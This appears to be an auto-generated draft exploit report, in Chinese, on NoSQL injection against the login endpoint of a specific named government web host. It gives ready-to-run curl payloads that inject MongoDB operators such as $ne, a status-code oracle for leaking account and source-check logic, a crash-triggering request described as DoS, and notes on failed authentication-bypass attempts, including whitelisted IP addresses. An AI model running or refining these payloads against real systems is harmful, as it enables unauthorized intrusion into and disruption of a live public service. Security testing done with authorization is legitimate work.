# POC/EXP — /login NoSQL 注入（username/password 未过滤 Mongo 操作符，403/500 oracle + DoS）

> 漏洞ID: `61b12da2-1805-42de-9e3c-c1ebeb4ae2b1`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4004/login (POST, JSON与form-urlencoded, username+password字段)`

**類型**: NoSQL 注入

## 描述

/login 的 username 与 password 字段未对 Mongo 查询操作符做转义/类型校验，直接拼入 MongoDB find 查询（后端疑似 JQLike，普遍接受 $ 操作符）。JSON 与 form-urlencoded 两种 Content-Type 均可触发。注入后可通过状态码差异（403 vs 500）构造 oracle：403="無法登入的來源"表示查询返回多文档且进入 source 校验；500 "TypeError" 表示查询返回 0/1 文档导致 result[0] 崩溃。可泄露用户名存在性、source 校验逻辑与校验顺序（source 先于密码）。

## POC / 復現步驟

```
PoC1(403 source泄露): curl -k -c /tmp/c -X POST 'https://epcr.tpf.gov.tw:4004/login' -H 'Content-Type: application/json' -b "connect.sid=$(curl -sk -c - 'https://epcr.tpf.gov.tw:4004/captcha'|awk '/connect.sid/{print $7}')" -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

PoC2(500 DoS): 同 URL -d '{"username":"admin","password":"x","captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 500 body="TypeError" (Content-Length 9)

PoC3(form-urlencoded): -d 'username=&password=&captcha=1&domain=AUTH_SERVER'
→ HTTP 500 "TypeError"

状态码Oracle矩阵:
- {"$ne":null}+$ne → 403 (多文档, 进source校验)
- "admin"+"x" → 500 (0/1文档, result[0]崩溃)
- form空值 → 500

操作符支持: $ne/$or/$and/$regex/$in/$gt/$where 均被接受(未过滤)
domain参数被完全忽略(28种值全相同403)
source校验在密码校验之前(NoSQL username+精确password仍403)

认证绕过受阻: source字段为硬编码白名单(值未知,非localhost/epcr.tpf.gov.tw/118.163.107.93/35.234.50.28这4个前端whiteListedDomains), 用户文档source值稀疏($and过滤41种值全500≤1文档), 宽泛source匹配($ne/$regex/$or)仍403, 证明白名单值特殊且用户文档source不匹配。
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
